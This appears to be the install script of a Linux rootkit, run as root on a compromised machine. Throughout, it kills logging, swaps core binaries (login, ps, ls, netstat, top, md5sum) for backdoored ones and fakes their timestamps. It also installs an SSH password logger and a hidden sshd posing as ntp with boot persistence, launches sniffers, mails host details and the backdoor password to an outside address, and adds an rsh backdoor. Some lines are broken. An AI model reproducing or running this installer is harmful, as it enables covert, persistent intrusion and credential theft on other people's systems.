#!/bin/sh


# Defines
mail =brehash@yahoo.com


# You dont need to edit anything below this
basedir=`pwd`

# lets unzip our shit now
tar xfz bin.tgz
tar xfz conf.tgz
tar xfz lib.tgz
rm -rf bin.tgz conf.tgz lib.tgz
tar xfz bin/ssh.tgz 
tar xfz bin/ssh-only.tgz
rm -rf ssh*.tgz
sleep 2 
cd $basedir

if [ "$#" != 1 ]; then
	echo "#-----------------------------------------#"
	echo "# This shit was brought to you by rehash."
	echo "# Here is the short usage of rkitv1.0"
	echo "# for more info rtfm.		"
	echo "# Credits goes to:		"
	echo "#	Krusader			"
	echo "# Greets to:			"
	echo "#	C0sMiNeL			"
	echo "#	Tzepes				"
	echo "#	hype				"
	echo "#	distrusu			"
	echo "#	Bebelushu			"
	echo "#	puyaahappy			"
	echo "# And to all my litle hackers out there.	"
	echo "#-----------------------------------------#"
	echo "# usage:					"
	echo "#	$0 <pass> <port> <ipaddr>		"
	echo "#-----------------------------------------#"
	echo "# where:					"
	echo "#	pass = your desired password		"
	echo "#	port = your desired port		"
	echo "#	ipaddr = hacked box real ip addr	"
	echo "#-----------------------------------------#"
	exit;
fi


if [ "$(whoami)" != "root" ]; then
echo "${RED}[${RED}sh${RED}] ${RED} BECOME ROOT YOU IDIOT ${RES}"
echo ""
exit
fi

RED='[1;31m'
RES='[0m'

killall -9 syslogd

startime=`date +%S`
mv lib/* /lib/
chattr -isa /sbin/xlogin 2>/dev/null
chattr -isa /bin/login 2>/dev/null
mv /sbin/xlogin /bin/login 2>/dev/null

/sbin/ldconfig

echo
echo "#-----------------------------------------#"
echo "#       ___                               "
echo "#      /\__\                              "
echo "#      \/__/                              "
echo "#               ___                       "
echo "#              /\__\                      "
echo "#              \/__/                      "
echo "#                                         "
echo "#               rsh+                "
echo "#                                         "
echo "#-----------------------------------------#"
echo "# This shit was brought to you by rehash. "
echo "# This shit is based on the shv4 rootkit. "
echo "# For more information rtfm.		"
echo "#-----------------------------------------#"
echo

if [ "`grep in.inetd /etc/rc.d/rc.sysinit`" ]; then

echo "# [Alert] sh-kit probably installed on machine"
chattr -AacdisSu /etc/ttyhash
rm -rf /etc/ttyhash
killall -9 nscd
killall -9 mountd
mv -f /sbin/xlogin /bin/login


else
fi
SYSLOGCONF="/etc/syslog.conf"

echo "# >>> Part 1/3 					#"
echo "#-----------------------------------------#"
echo "# [Installing trojans....]			#"
mkdir /lib/security 2>/dev/null
mkdir /lib/security/.config 2>/dev/null
mkdir /lib/security/.config/ssh 2>/dev/null

if test -n "$1" ; then
echo "#  Using Password : $1			#"
cd $basedir/bin
tar xfz $basedir/bin/ssh.tgz
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $1 > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7

if test -n "$2" ; then
echo "#  Using ssh-port : $2				#"
echo "Port $2" >> $basedir/bin/.sh/sshd_config
echo "3 $2" >> $basedir/conf/hosts.h
echo "4 $2" >> $basedir/conf/hosts.h

cat $basedir/bin/.sh/shdcf2 >> $basedir/bin/.sh/sshd_config ; rm -rf $basedir/bin/.sh/shdcf2

cd $basedir
mv $basedir/conf/lidps1.so /lib/lidps1.so
mv $basedir/conf/*  /usr/include/

# Ok lets start creating dirs
mkdir -p /lib/ldd.so/
cd $basedir/bin
mv .sh/* /lib/security/.config/ssh/
chattr -AacdisSu /usr/sbin/xntps 2>/dev/null
cp /lib/security/.config/ssh/sshd /usr/sbin/ntp
mv /lib/security/.config/ssh/sshd /lib/security/.config/
chmod 755 /usr/sbin/ntp
/usr/sbin/ntp -q
chattr +isa /usr/sbin/ntp
echo "/usr/sbin/ntp -q" >> /etc/rc.d/rc.sysinit

# Say hello to md5sum fixer boys n gurls !

/usr/bin/md5sum /sbin/ifconfig >> .shmd5
/usr/bin/md5sum /bin/ps >> .shmd5
/usr/bin/md5sum /bin/ls >> .shmd5
/usr/bin/md5sum /bin/netstat >> .shmd5
/usr/bin/md5sum /usr/bin/find >> .shmd5
/usr/bin/md5sum /usr/bin/top >> .shmd5
/usr/bin/md5sum /usr/sbin/lsof >> .shmd5
/usr/bin/md5sum /usr/bin/slocate >> .shmd5
/usr/bin/md5sum /usr/bin/dir >> .shmd5
/usr/bin/md5sum /usr/bin/md5sum >> .shmd5
/usr/bin/md5sum /bin/login >> .shmd5
./encrypt -e .shmd5 /dev/srd0
rm -rf .shmd5


# leet ssh login / pass logger
# enable if u want

tar xfz ssh-only.tgz
sdd=`which ssh`

if [ -f /usr/local/bin/ssh1 ] ;
then
echo "# ssh1 detected in :				#"
echo "#  - /usr/local/bin/ssh1			#"
touch -acmr /usr/local/bin/ssh1 ssh
mv -f ssh /usr/local/bin/ssh1
else
echo "# ssh detected in :				#"
echo "#  - sdd						#"
touch -acmr $sdd ssh
mv -f ssh $sdd
fi



# time change bitch

touch -acmr /sbin/ifconfig ifconfig
touch -acmr /bin/ps ps
touch -acmr /bin/ls ls
touch -acmr /bin/login login
touch -acmr /bin/netstat netstat
touch -acmr /usr/bin/find find
touch -acmr /usr/bin/top top
touch -acmr /usr/sbin/lsof lsof
touch -acmr /sbin/syslogd syslogd
touch -acmr /usr/bin/slocate slocate
touch -acmr /usr/bin/dir dir
touch -acmr /usr/bin/md5sum md5sum
touch -acmr /usr/bin/pstree pstree


# Backdoor ps/top/du/ls/netstat/etc..
./sz /bin/login login
cd $basedir/bin

chattr -AacdisSu /bin/ps
mv -f ps /bin/ps
chattr +AacdisSu /bin/ps
chattr -AacdisSu /sbin/ifconfig
mv -f ifconfig /sbin/ifconfig
chattr +AacdisSu /sbin/ifconfig
chattr -AacdisSu /bin/netstat
mv -f netstat /bin/netstat
chattr +AacdisSu /bin/netstat
chattr -AacdisSu /usr/bin/top
mv -f top /usr/bin/top
chattr +AacdisSu /usr/bin/top
chattr -AacdisSu /usr/bin/slocate
mv -f slocate /usr/bin/slocate
chattr +AacdisSu /usr/bin/slocate
chattr -AacdisSu /bin/login
mv -f /bin/login /bin/xlogin
mv -f login /bin/login
chattr +AacdisSu /bin/login
chattr -AacdisSu /bin/ls
mv -f ls /bin/ls
chattr +AacdisSu /bin/ls
chattr -AacdisSu /usr/bin/find
mv -f find /usr/bin/find
chattr +AacdisSu /usr/bin/find
chattr -AacdisSu /usr/bin/dir
mv -f dir /usr/bin/dir
chattr +isa /usr/bin/dir
chattr -AacdisSu /usr/sbin/lsof
mv -f lsof /usr/sbin/lsof
chattr +isa /usr/sbin/lsof
mv -f md5sum /usr/bin/md5sum
mv -f syslogd /sbin/syslogd	
mv -f pstree /usr/bin/pstree

echo "# >>> ps/du/ls/top/netstat/find <<< 	"
echo "# 	backdoored.			"
echo "#-----------------------------------------#"
echo "# [Moving our files...]			"

mv $basedir/bin/tks /lib/ldd.so/tks
mv $basedir/bin/tkp /lib/ldd.so/tkp
mv $basedir/bin/tksb /lib/ldd.so/tksb
.//lib/ldd.so/tks &

echo "# >>> sniff/parse/sauber <<<	 "
echo "#	moved	& installed		"
echo "# [Modifying system settings ]	"



if [ -f /lib/libncurses.so.5 ] ; then echo "" 
else
ln -s /lib/libncurses.so.4 /lib/libncurses.so.5 2>/dev/null
fi

echo "#-----------------------------------------#"
echo "# [System Information...]"
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | \
awk -F ' ' ' {print $2} ' | cut -c6-`
echo "# Hostname : `hostname -f` ($MYIPADDR)	"
uname -a | awk '{ print  $11 }' >/tmp/info_tmp
echo "# Arch : `cat /tmp/info_tmp` -+- 		"
echo "# Bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '	#"
echo "${DCYN}[${WHI}sh${DCYN}]# Alternative IP :${WHI} "`hostname -i`" -+-  Might be ["`/sbin/ifconfig | grep \eth | wc -l`" ] active adapters.${RES}"
if [ -f /etc/redhat-release ]; then
echo -n "# Distribution: cat /etc/issue"
else
echo -n "# Distribution: unknown"
fi
rm -rf /tmp/info_tmp
echo "$1:$2:`hostname -f`:$MYIPADDR:$dport" | mail $md5sum
endtime=`date +%S`
total=`expr $endtime - $startime`
echo "ntp" >> /usr/include/proc.h
echo "3 $2" >> /usr/include/hosts.h
echo "#-----------------------------------------#"
echo "# [ Sending e-mail ]				"
uptime >> /etc/info
echo "pass : $1" >> /etc/info
echo "port : $2" >> /etc/info
echo "ip : $3" >> /etc/info
/sbin/ifconfig >> /etc/info
df -h >> /etc/info
cat /proc/cpuinfo >> /etc/info
cat /proc/version >> /etc/info
cat /etc/hosts >> /etc/info
ping -c4 yahoo.com >> /etc/info
cat /etc/info |mail -s "hacked b0x" $mail
echo "# - Mail was sent to : $mail			"
echo "#-----------------------------------------#"
echo "# Sleeping 10 seconds.		"
sleep 10
echo "#-----------------------------------------#"
echo "# Installing rsh backdoor..."
tar xzf rsh-bd.tgz
cd rsh-bd/
./install
cd ..
echo "# All done."
echo "# Backdooring completed in :	"
echo "#	$total seconds			"
echo "#-----------------------------------------#"
echo "# 	!!!!!!OVER AND OUT!!!!!!"
echo "# Bugs report to:			"
echo "#	rehash@relevant-undernet.org	"
echo "#-----------------------------------------#"

cd $basedir
cd ../
rm -rf rsh/ rsh*.tgz
if [ -f /usr/sbin/syslogd ] ; then
/usr/sbin/syslogd -m 0
else
/sbin/syslogd -m 0
fi


if [ -f /usr/sbin/inetd ] ; 
then
killall inetd
/usr/sbin/inetd
else
killall -9 xinetd
/usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
fi


